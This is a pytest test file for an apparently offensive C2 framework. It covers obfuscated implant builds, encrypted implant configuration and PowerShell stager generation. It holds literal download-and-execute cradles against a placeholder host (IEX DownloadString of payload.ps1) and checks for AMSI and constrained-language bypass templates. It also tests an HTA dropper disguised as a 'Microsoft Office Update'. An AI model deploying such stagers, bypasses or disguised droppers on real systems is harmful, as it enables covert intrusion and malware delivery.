"""Hermetic branch coverage for C2 build and PowerShell rendering helpers."""

from __future__ import annotations

import base64
import json
import subprocess
from pathlib import Path

import pytest
from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.primitives.asymmetric import ed25519, x25519
from cryptography.hazmat.primitives.ciphers.aead import AESGCM

from core.c2 import builder
from core.c2.implants import powershell_stager as stager

pytestmark = [pytest.mark.unit, pytest.mark.security]


def _write_public_key(path: Path, public_key) -> None:
    path.write_bytes(
        public_key.public_bytes(
            serialization.Encoding.PEM,
            serialization.PublicFormat.SubjectPublicKeyInfo,
        )
    )


def test_builder_loads_only_x25519_public_keys(tmp_path) -> None:
    missing = tmp_path / "missing.pem"
    with pytest.raises(FileNotFoundError, match="Start the C2 server first"):
        builder.load_server_pub_key(str(missing))

    wrong = tmp_path / "ed25519.pem"
    _write_public_key(wrong, ed25519.Ed25519PrivateKey.generate().public_key())
    with pytest.raises(ValueError, match="not an X25519 key"):
        builder.load_server_pub_key(str(wrong))

    private_key = x25519.X25519PrivateKey.generate()
    expected = private_key.public_key().public_bytes(
        serialization.Encoding.Raw,
        serialization.PublicFormat.Raw,
    )
    valid = tmp_path / "x25519.pem"
    _write_public_key(valid, private_key.public_key())

    assert base64.b64decode(builder.load_server_pub_key(str(valid))) == expected


def test_builder_encrypts_an_authenticated_round_trip_configuration(monkeypatch: pytest.MonkeyPatch) -> None:
    called = []
    import core.c2.evasion as evasion_mod
    orig_aes = evasion_mod.aes_encrypt_payload

    def spy_aes(payload: bytes):
        called.append(payload)
        return orig_aes(payload)

    monkeypatch.setattr(evasion_mod, "aes_encrypt_payload", spy_aes)

    blob, hex_key = builder.encrypt_config(
        "https://one.test,https://two.test",
        "pin-one,pin-two",
        "server-public-key",
        "enrollment-token",
    )
    assert len(called) == 1

    packed = base64.b64decode(blob)
    plaintext = AESGCM(bytes.fromhex(hex_key)).decrypt(packed[:12], packed[12:], None)
    assert json.loads(plaintext) == {
        "urls": "https://one.test,https://two.test",
        "pins": "pin-one,pin-two",
        "pub": "server-public-key",
        "enrollment_token": "enrollment-token",
    }
    assert "SessionKDFContext" in builder._go_linker_flags("blob", "left", "right")
    assert "-buildid=" in builder._go_linker_flags("blob", "left", "right")


def test_garble_seed_is_stable_and_bound_to_locked_inputs(tmp_path: Path) -> None:
    module = tmp_path / "module"
    module.mkdir()
    source = module / "implant.go"
    source.write_text("package main\n", encoding="utf-8")
    (module / "go.mod").write_text("module fixture\n", encoding="utf-8")
    (module / "go.sum").write_text("fixture checksum\n", encoding="utf-8")
    (module / "toolchain.json").write_text(
        '{"schema_version": 1, "go": "go1.21.13", "garble": "v0.12.1"}\n',
        encoding="utf-8",
    )

    first = builder._garble_seed(str(source), str(module), "linux", "amd64")
    assert builder._garble_seed(str(source), str(module), "linux", "amd64") == first
    assert builder._garble_seed(str(source), str(module), "linux", "arm64") != first
    source.write_text("package main\n// changed\n", encoding="utf-8")
    assert builder._garble_seed(str(source), str(module), "linux", "amd64") != first


def _prepare_builder(monkeypatch):
    monkeypatch.setattr(builder, "load_server_pub_key", lambda _path: "server-public")
    monkeypatch.setattr(builder, "encrypt_config", lambda *args: ("encrypted", "a" * 64))


def test_runtime_data_dir_honors_explicit_and_platform_state_paths(
    monkeypatch: pytest.MonkeyPatch,
    tmp_path: Path,
) -> None:
    explicit = tmp_path / "explicit"
    monkeypatch.setenv("OCTOPUS_DATA_DIR", str(explicit))
    assert builder._runtime_data_dir() == str(explicit)

    monkeypatch.delenv("OCTOPUS_DATA_DIR")
    monkeypatch.setenv("XDG_STATE_HOME", str(tmp_path / "xdg"))
    assert builder._runtime_data_dir() == str(tmp_path / "xdg" / "octopus")

    monkeypatch.setenv("XDG_STATE_HOME", "relative-is-invalid")
    monkeypatch.setenv("HOME", str(tmp_path / "home"))
    assert builder._runtime_data_dir() == str(tmp_path / "home" / ".local" / "state" / "octopus")


def test_release_toolchain_contract_is_exact() -> None:
    module_dir = str(Path(builder.__file__).resolve().parent)
    assert builder._load_toolchain_contract(module_dir) == ("go1.21.13", "v0.12.1")


def test_build_implant_normalizes_targets_issues_token_and_builds(
    monkeypatch: pytest.MonkeyPatch,
    tmp_path: Path,
) -> None:
    _prepare_builder(monkeypatch)
    data_dir = tmp_path / "state"
    monkeypatch.setenv("OCTOPUS_DATA_DIR", str(data_dir))
    authority_paths: list[str] = []

    class Authority:
        def __init__(self, path: str) -> None:
            authority_paths.append(path)

        @staticmethod
        def issue() -> str:
            return "issued-token"

    import core.c2.enrollment as enrollment

    monkeypatch.setattr(enrollment, "EnrollmentAuthority", Authority)
    calls: list[tuple[list[str], dict]] = []

    def run(command, **kwargs):
        calls.append((command, kwargs))
        stdout = ""
        if command == ["go", "env", "GOVERSION"]:
            stdout = "go1.21.13\n"
        elif command == ["garble", "version"]:
            stdout = "mvdan.cc/garble v0.12.1\n"
        return subprocess.CompletedProcess(command, 0, stdout=stdout, stderr="")

    monkeypatch.setattr(builder.subprocess, "run", run)
    output = builder.build_implant(
        "windows",
        "arm64",
        ["https://one.test", "https://two.test"],
        "pin",
    )

    assert output == str(data_dir / "implant_windows_arm64.exe")
    assert authority_paths == [str(data_dir / "keys" / "enrollment.key")]
    assert calls[0][0] == ["go", "env", "GOVERSION"]
    assert calls[1][0] == ["garble", "version"]
    assert calls[2][0] == ["go", "mod", "verify"]
    build_command, build_options = calls[3]
    assert build_command[0] == "garble"
    assert build_command[1] == "-seed"
    assert build_command[3:6] == ["-tiny", "-literals", "build"]
    assert "-mod=readonly" in build_command
    assert "-trimpath" in build_command
    assert "-buildvcs=false" in build_command
    assert "https://one.test,https://two.test" not in " ".join(build_command)
    assert build_options["env"]["GOOS"] == "windows"
    assert build_options["env"]["GOARCH"] == "arm64"
    assert build_options["env"]["CGO_ENABLED"] == "0"
    assert build_options["env"]["GOPROXY"] == "off"
    assert build_options["env"]["GOSUMDB"] == "off"
    assert build_options["env"]["GOWORK"] == "off"
    assert build_options["env"]["GOTOOLCHAIN"] == "local"
    assert all(call[1]["env"]["GOPROXY"] == "off" for call in calls)
    assert all(call[0][0:3] != ["go", "mod", "tidy"] for call in calls)

    calls.clear()
    linux_output = builder.build_implant(
        "linux",
        "amd64",
        "https://one.test",
        enrollment_token="supplied-token",
    )
    assert linux_output == str(data_dir / "implant_linux_amd64")
    assert len(authority_paths) == 1


@pytest.mark.parametrize(
    ("operating_system", "architecture", "message"),
    [
        ("plan9", "amd64", "Unsupported target OS"),
        ("linux", "386", "Unsupported target architecture"),
    ],
)
def test_build_implant_rejects_unsupported_targets(
    operating_system: str,
    architecture: str,
    message: str,
) -> None:
    with pytest.raises(ValueError, match=message):
        builder.build_implant(
            operating_system,
            architecture,
            enrollment_token="supplied",
        )


def test_build_implant_reports_dependency_and_compiler_failures(
    monkeypatch: pytest.MonkeyPatch,
    capsys: pytest.CaptureFixture[str],
    tmp_path: Path,
) -> None:
    _prepare_builder(monkeypatch)
    monkeypatch.setenv("OCTOPUS_DATA_DIR", str(tmp_path / "state"))

    def verify_failure(command, **_kwargs):
        if command == ["go", "env", "GOVERSION"]:
            return subprocess.CompletedProcess(command, 0, stdout="go1.21.13\n", stderr="")
        if command == ["garble", "version"]:
            return subprocess.CompletedProcess(
                command,
                0,
                stdout="mvdan.cc/garble v0.12.1\n",
                stderr="",
            )
        raise subprocess.CalledProcessError(1, command, stderr="module failure")

    monkeypatch.setattr(builder.subprocess, "run", verify_failure)
    with pytest.raises(SystemExit) as verify_exit:
        builder.build_implant(enrollment_token="supplied")
    assert verify_exit.value.code == 1
    assert "module failure" in capsys.readouterr().out

    def missing_garble(command, **_kwargs):
        if command == ["go", "env", "GOVERSION"]:
            return subprocess.CompletedProcess(command, 0, stdout="go1.21.13\n", stderr="")
        if command == ["garble", "version"]:
            raise FileNotFoundError("garble")
        return subprocess.CompletedProcess(command, 0, stdout="", stderr="")

    monkeypatch.setattr(builder.subprocess, "run", missing_garble)
    with pytest.raises(SystemExit) as garble_exit:
        builder.build_implant(enrollment_token="supplied")
    assert garble_exit.value.code == 1
    assert "C2 build tool is not installed" in capsys.readouterr().out

    def failed_build(command, **_kwargs):
        if command == ["go", "env", "GOVERSION"]:
            return subprocess.CompletedProcess(command, 0, stdout="go1.21.13\n", stderr="")
        if command == ["garble", "version"]:
            return subprocess.CompletedProcess(
                command,
                0,
                stdout="mvdan.cc/garble v0.12.1\n",
                stderr="",
            )
        if command[0] == "garble" and "build" in command:
            raise subprocess.CalledProcessError(2, command)
        return subprocess.CompletedProcess(command, 0, stdout="", stderr="")

    monkeypatch.setattr(builder.subprocess, "run", failed_build)
    with pytest.raises(RuntimeError, match="Go implant build failed"):
        builder.build_implant(enrollment_token="supplied")


@pytest.mark.parametrize(
    ("go_version", "garble_output", "expected"),
    (
        ("go1.21.12\n", "mvdan.cc/garble v0.12.1\n", "requires Go go1.21.13"),
        ("go1.21.13\n", "mvdan.cc/garble v0.12.0\n", "requires Garble v0.12.1"),
        ("go1.21.13\n", "unparseable\n", "found unknown"),
    ),
)
def test_toolchain_verification_rejects_version_drift(
    monkeypatch: pytest.MonkeyPatch,
    go_version: str,
    garble_output: str,
    expected: str,
) -> None:
    def run(command, **_kwargs):
        stdout = go_version if command[0] == "go" else garble_output
        return subprocess.CompletedProcess(command, 0, stdout=stdout, stderr="")

    monkeypatch.setattr(builder.subprocess, "run", run)
    module_dir = str(Path(builder.__file__).resolve().parent)

    with pytest.raises(RuntimeError, match=expected):
        builder._verify_toolchain(module_dir, {})


@pytest.mark.parametrize(
    ("method", "needle"),
    [
        ("IEX", "DownloadString"),
        ("iwr", "Invoke-WebRequest"),
        ("xml", "XmlDocument"),
        ("bits", "Start-BitsTransfer"),
        ("wscript", "WScript.Shell"),
    ],
)
def test_each_powershell_stager_method_renders_its_expected_boundary(
    monkeypatch,
    method: str,
    needle: str,
) -> None:
    monkeypatch.setattr(stager, "_split_url_for_obfuscation", lambda _url: ["https://", "host/payload"])
    monkeypatch.setattr(stager, "_rand_var", lambda: "variable")
    monkeypatch.setattr(stager.secrets, "token_hex", lambda _length: "deadbeef")

    rendered = stager.generate_ps_stager("https://host/payload", method)

    assert rendered.startswith("powershell ")
    assert needle in rendered
    assert "'https://'+'host/payload'" in rendered


def test_powershell_stager_rejects_unknown_method() -> None:
    with pytest.raises(ValueError, match="Unsupported stager method: unknown"):
        stager.generate_ps_stager("https://host/payload", "unknown")


def test_encoded_stager_round_trips_the_inner_script(monkeypatch) -> None:
    monkeypatch.setattr(stager, "_rand_var", lambda: "client")
    rendered = stager.generate_ps_encoded("https://host/payload.ps1")
    encoded = rendered.rsplit(" ", 1)[-1]

    assert base64.b64decode(encoded).decode("utf-16-le") == (
        "$client=New-Object Net.WebClient;IEX($client.DownloadString('https://host/payload.ps1'))"
    )


@pytest.mark.parametrize(
    ("technique", "needle"),
    [
        ("reflection", "Reflection Method"),
        ("patch", "Memory Patch"),
        ("initfailed", "InitFailed"),
    ],
)
def test_all_amsi_templates_are_renderable(monkeypatch, technique: str, needle: str) -> None:
    monkeypatch.setattr(stager.random, "choice", lambda _items: technique)
    monkeypatch.setattr(stager, "_rand_var", lambda: "variable")
    monkeypatch.setattr(stager.secrets, "token_hex", lambda _length: "cafebabe")

    assert needle in stager.generate_ps_amsi_bypass()


@pytest.mark.parametrize(
    ("technique", "needle"),
    [
        ("runspace", "Custom Runspace"),
        ("installutil", "InstallUtil"),
        ("msbuild", "MSBuild Inline Task"),
    ],
)
def test_all_clm_templates_are_renderable(monkeypatch, technique: str, needle: str) -> None:
    monkeypatch.setattr(stager.random, "choice", lambda _items: technique)
    monkeypatch.setattr(stager, "_rand_var", lambda: "variable")
    monkeypatch.setattr(stager.secrets, "token_hex", lambda _length: "cafebabe")

    assert needle in stager.generate_ps_clm_bypass()


def test_hta_dropper_contains_encoded_payload_and_randomized_decoy(monkeypatch, caplog) -> None:
    monkeypatch.setattr(stager, "_rand_var_vbs", lambda: "variable")
    monkeypatch.setattr(stager.random, "choice", lambda items: items[0])
    monkeypatch.setattr(stager.secrets, "token_hex", lambda _length: "a1b2c3d4")

    with caplog.at_level("INFO"):
        rendered = stager.generate_hta_dropper("https://host/payload.ps1")

    assert "Microsoft Office Update" in rendered
    assert "A1B2C3D4" in rendered
    encoded = rendered.split("-EncodedCommand ", 1)[1].split('"', 1)[0]
    assert base64.b64decode(encoded).decode("utf-16-le") == (
        "IEX(New-Object Net.WebClient).DownloadString('https://host/payload.ps1')"
    )
    assert "Generated HTA dropper" in caplog.text


def test_random_name_and_url_helpers_cover_empty_and_chunked_inputs(monkeypatch) -> None:
    monkeypatch.setattr(stager.random, "randint", lambda minimum, maximum: minimum)
    monkeypatch.setattr(stager.random, "choice", lambda _alphabet: "a")
    monkeypatch.setattr(stager.random, "choices", lambda _alphabet, *, k: ["b"] * k)

    assert stager._rand_var(3, 8) == "abb"
    assert stager._rand_var_vbs(4, 8) == "abbb"
    assert stager._split_url_for_obfuscation("") == []
    assert stager._split_url_for_obfuscation("abcdefgh") == ["abc", "def", "gh"]
